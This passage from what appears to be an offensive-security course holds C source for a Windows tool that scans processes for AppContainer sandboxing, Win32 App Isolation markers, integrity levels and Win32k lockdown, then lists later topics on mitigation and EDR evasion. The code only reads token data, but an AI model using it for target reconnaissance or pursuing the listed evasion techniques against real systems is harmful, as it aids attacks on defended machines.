} MY_UNICODE_STRING, *PMY_UNICODE_STRING;

typedef struct _MY_TOKEN_SECURITY_ATTRIBUTE_FQBN_VALUE {
    ULONG64 Version;
    MY_UNICODE_STRING Name;
} MY_TOKEN_SECURITY_ATTRIBUTE_FQBN_VALUE, *PMY_TOKEN_SECURITY_ATTRIBUTE_FQBN_VALUE;

typedef struct _MY_TOKEN_SECURITY_ATTRIBUTE_OCTET_STRING_VALUE {
    PVOID pValue;
    ULONG ValueLength;
} MY_TOKEN_SECURITY_ATTRIBUTE_OCTET_STRING_VALUE, *PMY_TOKEN_SECURITY_ATTRIBUTE_OCTET_STRING_VALUE;

typedef struct _MY_TOKEN_SECURITY_ATTRIBUTE_V1 {
    MY_UNICODE_STRING Name;
    USHORT ValueType;
    USHORT Reserved;
    ULONG Flags;
    ULONG ValueCount;
    union {
        PLONG64 pInt64;
        PULONG64 pUint64;
        PMY_UNICODE_STRING pString;
        PMY_TOKEN_SECURITY_ATTRIBUTE_FQBN_VALUE pFqbn;
        PMY_TOKEN_SECURITY_ATTRIBUTE_OCTET_STRING_VALUE pOctetString;
    } Values;
} MY_TOKEN_SECURITY_ATTRIBUTE_V1, *PMY_TOKEN_SECURITY_ATTRIBUTE_V1;

typedef struct _MY_TOKEN_SECURITY_ATTRIBUTES_INFORMATION {
    USHORT Version;
    USHORT Reserved;
    ULONG AttributeCount;
    union {
        PMY_TOKEN_SECURITY_ATTRIBUTE_V1 pAttributeV1;
    } Attribute;
} MY_TOKEN_SECURITY_ATTRIBUTES_INFORMATION, *PMY_TOKEN_SECURITY_ATTRIBUTES_INFORMATION;

#define MY_TOKEN_SECURITY_ATTRIBUTE_TYPE_INVALID 0x00
#define MY_TOKEN_SECURITY_ATTRIBUTE_TYPE_INT64 0x01
#define MY_TOKEN_SECURITY_ATTRIBUTE_TYPE_UINT64 0x02
#define MY_TOKEN_SECURITY_ATTRIBUTE_TYPE_STRING 0x03
#define MY_TOKEN_SECURITY_ATTRIBUTE_TYPE_FQBN 0x04
#define MY_TOKEN_SECURITY_ATTRIBUTE_TYPE_SID 0x05
#define MY_TOKEN_SECURITY_ATTRIBUTE_TYPE_BOOLEAN 0x06
#define MY_TOKEN_SECURITY_ATTRIBUTE_TYPE_OCTET_STRING 0x10

// Function pointer for GetProcessMitigationPolicy
typedef BOOL (WINAPI *PFN_GetProcessMitigationPolicy)(
    HANDLE hProcess,
    int MitigationPolicy,
    PVOID lpBuffer,
    SIZE_T dwLength
);

BOOL CheckWin32kLockdown(HANDLE hProcess) {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) return FALSE;

    PFN_GetProcessMitigationPolicy pfnGetProcessMitigationPolicy =
        (PFN_GetProcessMitigationPolicy)GetProcAddress(hKernel32, "GetProcessMitigationPolicy");

    if (!pfnGetProcessMitigationPolicy) return FALSE;

    PROCESS_MITIGATION_SYSTEM_CALL_DISABLE_POLICY policy = {0};
    if (pfnGetProcessMitigationPolicy(hProcess, ProcessSystemCallDisablePolicy,
                                      &policy, sizeof(policy))) {
        return policy.DisallowWin32kSystemCalls;
    }

    return FALSE;
}

BOOL GetTokenCapabilitiesDetailed(HANDLE hProcess, DWORD *pCapCount, PWSTR **ppCapNames) {
    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenCapabilities, NULL, 0, &dwSize);

    if (dwSize == 0) {
        CloseHandle(hToken);
        return FALSE;
    }

    PTOKEN_GROUPS pCapabilities = (PTOKEN_GROUPS)malloc(dwSize);
    if (!pCapabilities) {
        CloseHandle(hToken);
        return FALSE;
    }

    BOOL result = FALSE;
    if (GetTokenInformation(hToken, TokenCapabilities, pCapabilities, dwSize, &dwSize)) {
        *pCapCount = pCapabilities->GroupCount;

        if (ppCapNames && pCapabilities->GroupCount > 0) {
            *ppCapNames = (PWSTR*)malloc(sizeof(PWSTR) * pCapabilities->GroupCount);
            if (*ppCapNames) {
                for (DWORD i = 0; i < pCapabilities->GroupCount; i++) {
                    ConvertSidToStringSidW(pCapabilities->Groups[i].Sid, &(*ppCapNames)[i]);
                }
            }
        }
        result = TRUE;
    }

    free(pCapabilities);
    CloseHandle(hToken);
    return result;
}

BOOL GetProcessIntegrityLevel(HANDLE hProcess, DWORD *pIntegrityLevel) {
    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwSize);

    PTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)malloc(dwSize);
    if (!pTIL) {
        CloseHandle(hToken);
        return FALSE;
    }

    BOOL result = FALSE;
    if (GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwSize, &dwSize)) {
        *pIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid,
            (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));
        result = TRUE;
    }

    free(pTIL);
    CloseHandle(hToken);
    return result;
}

BOOL GetAppContainerSid(HANDLE hProcess, PWSTR *ppSidString) {
    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenAppContainerSid, NULL, 0, &dwSize);

    if (dwSize == 0) {
        CloseHandle(hToken);
        return FALSE;
    }

    PTOKEN_APPCONTAINER_INFORMATION pAppContainer = (PTOKEN_APPCONTAINER_INFORMATION)malloc(dwSize);
    if (!pAppContainer) {
        CloseHandle(hToken);
        return FALSE;
    }

    BOOL result = FALSE;
    if (GetTokenInformation(hToken, TokenAppContainerSid, pAppContainer, dwSize, &dwSize)) {
        if (pAppContainer->TokenAppContainer) {
            ConvertSidToStringSidW(pAppContainer->TokenAppContainer, ppSidString);
            result = TRUE;
        }
    }

    free(pAppContainer);
    CloseHandle(hToken);
    return result;
}

BOOL GetTokenCapabilities(HANDLE hProcess, DWORD *pCapCount) {
    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenCapabilities, NULL, 0, &dwSize);

    if (dwSize == 0) {
        CloseHandle(hToken);
        return FALSE;
    }

    PTOKEN_GROUPS pCapabilities = (PTOKEN_GROUPS)malloc(dwSize);
    if (!pCapabilities) {
        CloseHandle(hToken);
        return FALSE;
    }

    BOOL result = FALSE;
    if (GetTokenInformation(hToken, TokenCapabilities, pCapabilities, dwSize, &dwSize)) {
        *pCapCount = pCapabilities->GroupCount;
        result = TRUE;
    }

    free(pCapabilities);
    CloseHandle(hToken);
    return result;
}

BOOL IsProcessIsolatedWin32(HANDLE hProcess, BOOL verbose) {
    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    // Check 1: Is this an AppContainer token?
    DWORD isAppContainer = 0;
    DWORD size = sizeof(isAppContainer);
    if (!GetTokenInformation(hToken, TokenIsAppContainer, &isAppContainer, size, &size)) {
        CloseHandle(hToken);
        return FALSE;
    }

    if (!isAppContainer) {
        CloseHandle(hToken);
        return FALSE;
    }

    if (verbose) {
        printf("  [+] AppContainer: YES\n");

        // Get integrity level
        DWORD integrityLevel = 0;
        if (GetProcessIntegrityLevel(hProcess, &integrityLevel)) {
            printf("  [+] Integrity Level: 0x%X ", integrityLevel);
            if (integrityLevel < SECURITY_MANDATORY_LOW_RID) {
                printf("(Untrusted)\n");
            } else if (integrityLevel < SECURITY_MANDATORY_MEDIUM_RID) {
                printf("(Low)\n");
            } else if (integrityLevel < SECURITY_MANDATORY_HIGH_RID) {
                printf("(Medium)\n");
            } else {
                printf("(High/System)\n");
            }
        }

        // Get AppContainer SID
        PWSTR sidString = NULL;
        if (GetAppContainerSid(hProcess, &sidString)) {
            printf("  [+] AppContainer SID: %S\n", sidString);
            LocalFree(sidString);
        }

        // Get capabilities count
        DWORD capCount = 0;
        if (GetTokenCapabilities(hProcess, &capCount)) {
            printf("  [+] Capabilities: %d\n", capCount);
        }
    }

    // Check 2: Query security attributes for "isolatedWin32" markers
    DWORD attrSize = 0;
    GetTokenInformation(hToken, (TOKEN_INFORMATION_CLASS)73, NULL, 0, &attrSize); // TokenSecurityAttributes = 73

    BOOL hasIsolationAttrs = FALSE;
    if (attrSize > 0) {
        PVOID attrBuf = malloc(attrSize);
        if (attrBuf && GetTokenInformation(hToken, (TOKEN_INFORMATION_CLASS)73,
                                attrBuf, attrSize, &attrSize)) {
            PMY_TOKEN_SECURITY_ATTRIBUTES_INFORMATION pAttrs =
                (PMY_TOKEN_SECURITY_ATTRIBUTES_INFORMATION)attrBuf;

            if (verbose && pAttrs->AttributeCount > 0) {
                printf("  [+] Security Attributes:\n");
            }

            for (DWORD i = 0; i < pAttrs->AttributeCount; i++) {
                PMY_TOKEN_SECURITY_ATTRIBUTE_V1 attr = &pAttrs->Attribute.pAttributeV1[i];

                if (attr->Name.Buffer) {
                    if (verbose) {
                        printf("      - %S\n", attr->Name.Buffer);
                    }

                    // Check for Win32 App Isolation markers
                    if (wcsstr(attr->Name.Buffer, L"WIN://SYSAPPID") ||
                        wcsstr(attr->Name.Buffer, L"WIN://PKG") ||
                        wcsstr(attr->Name.Buffer, L"WIN://NOALLAPPPKG")) {
                        hasIsolationAttrs = TRUE;
                    }
                }
            }
        }
        if (attrBuf) free(attrBuf);
    }

    CloseHandle(hToken);
    return isAppContainer && hasIsolationAttrs;
}

BOOL GetPackageFamilyName(HANDLE hProcess, PWSTR *ppPackageName) {
    typedef LONG (WINAPI *PFN_GetPackageFamilyName)(HANDLE, UINT32*, PWSTR);

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) return FALSE;

    PFN_GetPackageFamilyName pfnGetPackageFamilyName =
        (PFN_GetPackageFamilyName)GetProcAddress(hKernel32, "GetPackageFamilyName");

    if (!pfnGetPackageFamilyName) return FALSE;

    UINT32 length = 0;
    LONG result = pfnGetPackageFamilyName(hProcess, &length, NULL);

    if (result != ERROR_INSUFFICIENT_BUFFER || length == 0) {
        return FALSE;
    }

    *ppPackageName = (PWSTR)malloc(length * sizeof(WCHAR));
    if (!*ppPackageName) return FALSE;

    result = pfnGetPackageFamilyName(hProcess, &length, *ppPackageName);
    if (result != ERROR_SUCCESS) {
        free(*ppPackageName);
        *ppPackageName = NULL;
        return FALSE;
    }

    return TRUE;
}

typedef struct _ISOLATION_INFO {
    BOOL isAppContainer;
    BOOL hasIsolationAttrs;
    BOOL hasWin32kLockdown;
    BOOL hasPackageIdentity;
    DWORD integrityLevel;
    DWORD capabilityCount;
    PWSTR appContainerSid;
    PWSTR packageFamilyName;
    PWSTR *capabilityNames;
    WCHAR **securityAttributes;
    DWORD securityAttributeCount;
} ISOLATION_INFO, *PISOLATION_INFO;

void FreeIsolationInfo(PISOLATION_INFO pInfo) {
    if (!pInfo) return;

    if (pInfo->appContainerSid) {
        LocalFree(pInfo->appContainerSid);
    }

    if (pInfo->packageFamilyName) {
        free(pInfo->packageFamilyName);
    }

    if (pInfo->capabilityNames) {
        for (DWORD i = 0; i < pInfo->capabilityCount; i++) {
            if (pInfo->capabilityNames[i]) {
                LocalFree(pInfo->capabilityNames[i]);
            }
        }
        free(pInfo->capabilityNames);
    }

    if (pInfo->securityAttributes) {
        for (DWORD i = 0; i < pInfo->securityAttributeCount; i++) {
            if (pInfo->securityAttributes[i]) {
                free(pInfo->securityAttributes[i]);
            }
        }
        free(pInfo->securityAttributes);
    }
}

BOOL AnalyzeProcessIsolation(HANDLE hProcess, PISOLATION_INFO pInfo) {
    ZeroMemory(pInfo, sizeof(ISOLATION_INFO));

    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    // Check 1: Is this an AppContainer token?
    DWORD isAppContainer = 0;
    DWORD size = sizeof(isAppContainer);
    if (GetTokenInformation(hToken, TokenIsAppContainer, &isAppContainer, size, &size)) {
        pInfo->isAppContainer = isAppContainer;
    }

    if (!pInfo->isAppContainer) {
        CloseHandle(hToken);
        return FALSE;
    }

    // Check 2: Get integrity level
    GetProcessIntegrityLevel(hProcess, &pInfo->integrityLevel);

    // Check 3: Get AppContainer SID
    GetAppContainerSid(hProcess, &pInfo->appContainerSid);

    // Check 4: Get capabilities
    GetTokenCapabilitiesDetailed(hProcess, &pInfo->capabilityCount, &pInfo->capabilityNames);

    // Check 5: Check Win32k lockdown
    pInfo->hasWin32kLockdown = CheckWin32kLockdown(hProcess);

    // Check 6: Get package family name
    pInfo->hasPackageIdentity = GetPackageFamilyName(hProcess, &pInfo->packageFamilyName);

    // Check 7: Query security attributes for "isolatedWin32" markers
    DWORD attrSize = 0;
    GetTokenInformation(hToken, (TOKEN_INFORMATION_CLASS)73, NULL, 0, &attrSize);

    if (attrSize > 0) {
        PVOID attrBuf = malloc(attrSize);
        if (attrBuf && GetTokenInformation(hToken, (TOKEN_INFORMATION_CLASS)73, attrBuf, attrSize, &attrSize)) {
            PMY_TOKEN_SECURITY_ATTRIBUTES_INFORMATION pAttrs = (PMY_TOKEN_SECURITY_ATTRIBUTES_INFORMATION)attrBuf;

            if (pAttrs->AttributeCount > 0) {
                pInfo->securityAttributes = (WCHAR**)malloc(sizeof(WCHAR*) * pAttrs->AttributeCount);
                pInfo->securityAttributeCount = pAttrs->AttributeCount;

                for (DWORD i = 0; i < pAttrs->AttributeCount; i++) {
                    PMY_TOKEN_SECURITY_ATTRIBUTE_V1 attr = &pAttrs->Attribute.pAttributeV1[i];

                    if (attr->Name.Buffer && attr->Name.Length > 0) {
                        size_t bufLen = attr->Name.Length + sizeof(WCHAR);
                        pInfo->securityAttributes[i] = (WCHAR*)malloc(bufLen);
                        if (pInfo->securityAttributes[i]) {
                            wcsncpy_s(pInfo->securityAttributes[i], bufLen / sizeof(WCHAR),
                                     attr->Name.Buffer, attr->Name.Length / sizeof(WCHAR));
                        }

                        // Check for Win32 App Isolation markers
                        if (wcsstr(attr->Name.Buffer, L"WIN://SYSAPPID") ||
                            wcsstr(attr->Name.Buffer, L"WIN://PKG") ||
                            wcsstr(attr->Name.Buffer, L"WIN://NOALLAPPPKG")) {
                            pInfo->hasIsolationAttrs = TRUE;
                        }
                    } else {
                        pInfo->securityAttributes[i] = NULL;
                    }
                }
            }
        }
        if (attrBuf) free(attrBuf);
    }

    CloseHandle(hToken);
    return TRUE;
}

void PrintIsolationInfo(const char *processName, DWORD pid, PISOLATION_INFO pInfo) {
    printf("\n|================================================================|\n");
    printf("| Process: %-50s |\n", processName);
    printf("| PID: %-56d |\n", pid);
    printf("|=================================================================|\n");

    printf("| AppContainer:        %-37s |\n", pInfo->isAppContainer ? "YES" : "NO");
    printf("| Isolation Attributes: %-36s |\n", pInfo->hasIsolationAttrs ? "YES" : "NO");
    printf("| Win32k Lockdown:     %-37s |\n", pInfo->hasWin32kLockdown ? "YES" : "NO");
    printf("| Package Identity:    %-37s |\n", pInfo->hasPackageIdentity ? "YES" : "NO");

    printf("| Integrity Level:     0x%04X ", pInfo->integrityLevel);
    if (pInfo->integrityLevel < SECURITY_MANDATORY_LOW_RID) {
        printf("%-28s |\n", "(Untrusted)");
    } else if (pInfo->integrityLevel < SECURITY_MANDATORY_MEDIUM_RID) {
        printf("%-28s |\n", "(Low)");
    } else if (pInfo->integrityLevel < SECURITY_MANDATORY_HIGH_RID) {
        printf("%-28s |\n", "(Medium)");
    } else {
        printf("%-28s |\n", "(High/System)");
    }

    printf("| Capabilities:        %-37d |\n", pInfo->capabilityCount);

    if (pInfo->appContainerSid) {
        printf("|===============================================================|\n");
        printf("| AppContainer SID:                                             |\n");
        wprintf(L"|   %s", pInfo->appContainerSid);
        int sidLen = wcslen(pInfo->appContainerSid);
        for (int i = sidLen + 4; i < 63; i++) printf(" ");
        printf("|\n");
    }

    if (pInfo->packageFamilyName) {
        printf("|===============================================================|\n");
        printf("| Package Family Name:                                          |\n");
        wprintf(L"|   %s", pInfo->packageFamilyName);
        int pkgLen = wcslen(pInfo->packageFamilyName);
        for (int i = pkgLen + 4; i < 63; i++) printf(" ");
        printf("|\n");
    }

    if (pInfo->capabilityCount > 0 && pInfo->capabilityNames) {
        printf("|===============================================================|\n");
        printf("| Capabilities (first 5):                                       |\n");
        for (DWORD i = 0; i < pInfo->capabilityCount && i < 5; i++) {
            if (pInfo->capabilityNames[i]) {
                wprintf(L"|   %d. %s", i+1, pInfo->capabilityNames[i]);
                int capLen = wcslen(pInfo->capabilityNames[i]);
                for (int j = capLen + 6; j < 63; j++) printf(" ");
                printf("|\n");
            }
        }
        if (pInfo->capabilityCount > 5) {
            printf("|   ... and %d more                                            ",
                   pInfo->capabilityCount - 5);
            int numLen = (pInfo->capabilityCount - 5 >= 10) ? 2 : 1;
            for (int i = numLen + 14; i < 59; i++) printf(" ");
            printf("|\n");
        }
    }

    if (pInfo->securityAttributeCount > 0 && pInfo->securityAttributes) {
        printf("|===============================================================|\n");
        printf("| Security Attributes (first 8):                                |\n");
        for (DWORD i = 0; i < pInfo->securityAttributeCount && i < 8; i++) {
            if (pInfo->securityAttributes[i]) {
                wprintf(L"|   • %s", pInfo->securityAttributes[i]);
                int attrLen = wcslen(pInfo->securityAttributes[i]);
                for (int j = attrLen + 5; j < 63; j++) printf(" ");
                printf("|\n");
            }
        }
        if (pInfo->securityAttributeCount > 8) {
            printf("|   ... and %d more                                            ",
                   pInfo->securityAttributeCount - 8);
            int numLen = (pInfo->securityAttributeCount - 8 >= 10) ? 2 : 1;
            for (int i = numLen + 14; i < 59; i++) printf(" ");
            printf("|\n");
        }
    }

    printf("|===============================================================|\n");

    // Determine isolation level
    if (pInfo->hasIsolationAttrs && pInfo->hasWin32kLockdown) {
        printf("\n>>> STRONG ISOLATION: Win32 App Isolation with Win32k Lockdown <<<\n");
    } else if (pInfo->hasIsolationAttrs) {
        printf("\n>>> MODERATE ISOLATION: Win32 App Isolation <<<\n");
    } else if (pInfo->isAppContainer) {
        printf("\n>>> BASIC ISOLATION: AppContainer (UWP/MSIX) <<<\n");
    }
}

void ScanForIsolatedAppsEnhanced(BOOL showAll) {
    printf("===============================================================\n");
    printf("  Win32 App Isolation - Comprehensive Process Scan\n");
    printf("===============================================================\n");

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create process snapshot (Error: %d)\n", GetLastError());
        return;
    }

    PROCESSENTRY32 pe = { sizeof(pe) };
    int isolated_count = 0;
    int appcontainer_count = 0;
    int strong_isolation_count = 0;

    if (Process32First(hSnapshot, &pe)) {
        do {
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
            if (!hProc) continue;

            ISOLATION_INFO info;
            if (AnalyzeProcessIsolation(hProc, &info)) {
                appcontainer_count++;

                if (info.hasIsolationAttrs) {
                    isolated_count++;
                    if (info.hasWin32kLockdown) {
                        strong_isolation_count++;
                    }
                    PrintIsolationInfo(pe.szExeFile, pe.th32ProcessID, &info);
                } else if (showAll) {
                    // Show all AppContainer processes even if not isolated
                    PrintIsolationInfo(pe.szExeFile, pe.th32ProcessID, &info);
                }

                FreeIsolationInfo(&info);
            }

            CloseHandle(hProc);
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);

    printf("\n==============================================================\n");
    printf("  Scan Summary\n");
    printf("==============================================================\n");
    printf("  Total AppContainer processes:     %d\n", appcontainer_count);
    printf("  Isolated Win32 processes:         %d\n", isolated_count);
    printf("  Strong isolation (Win32k locked): %d\n", strong_isolation_count);
    printf("==============================================================\n");

    if (isolated_count == 0 && appcontainer_count > 0) {
        printf("\n[i] Note: Found %d AppContainer processes but none with Win32 App\n", appcontainer_count);
        printf("    Isolation markers. This is expected on Windows < 11 24H2 or if\n");
        printf("    no isolated Win32 apps are currently running.\n");
        printf("\n[i] Run with '-v' flag to see details of all AppContainer processes.\n");
    }
}

void ScanForIsolatedApps() {
    printf("=== Win32 App Isolation - Process Scan ===\n\n");

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create process snapshot\n");
        return;
    }

    PROCESSENTRY32 pe = { sizeof(pe) };
    int isolated_count = 0;
    int appcontainer_count = 0;

    if (Process32First(hSnapshot, &pe)) {
        do {
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
            if (!hProc) continue;

            HANDLE hToken;
            if (OpenProcessToken(hProc, TOKEN_QUERY, &hToken)) {
                DWORD isAppContainer = 0;
                DWORD size = sizeof(isAppContainer);

                if (GetTokenInformation(hToken, TokenIsAppContainer, &isAppContainer, size, &size)) {
                    if (isAppContainer) {
                        appcontainer_count++;
                        printf("\n[APPCONTAINER] %s (PID %d)\n", pe.szExeFile, pe.th32ProcessID);

                        if (IsProcessIsolatedWin32(hProc, TRUE)) {
                            printf("  >>> ISOLATED WIN32 APP <<<\n");
                            isolated_count++;
                        }
                    }
                }
                CloseHandle(hToken);
            }

            CloseHandle(hProc);
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);

    printf("\n[*] Found %d AppContainer processes\n", appcontainer_count);
    printf("[*] Found %d isolated Win32 processes\n", isolated_count);
}

int main(int argc, char *argv[]) {
    BOOL verbose = FALSE;

    // Parse command line arguments
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--verbose") == 0) {
            verbose = TRUE;
        } else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            printf("Usage: %s [OPTIONS]\n\n", argv[0]);
            printf("Options:\n");
            printf("  -v, --verbose    Show all AppContainer processes (not just isolated)\n");
            printf("  -h, --help       Show this help message\n\n");
            printf("Description:\n");
            printf("  Scans for Win32 App Isolation processes on Windows 11 24H2+.\n");
            printf("  By default, only shows processes with isolation markers.\n");
            printf("  Use -v to see all AppContainer processes.\n\n");
            return 0;
        }
    }

    printf("\n");
    printf("|===============================================================|\n");
    printf("|                                                               |\n");
    printf("|         Win32 App Isolation Detection & Analysis              |\n");
    printf("|                                                               |\n");
    printf("|===============================================================|\n");
    printf("\n");

    ScanForIsolatedAppsEnhanced(verbose);
    return 0;
}
```

## Week 7 Summary

Connection to Week 8 (Mitigation Bypass):\*\*
Week 8 dives deeper into specific bypass techniques:

- ASLR info leak methods
- DEP bypass via ROP
- CFG/CET evasion
- Stack cookie bypass

**Connection to Week 10 (EDR Evasion):**
Week 10 covers operational evasion:

- Usermode hook bypass
- ETW blinding
- Kernel callback manipulation
- Complete EDR bypass chains
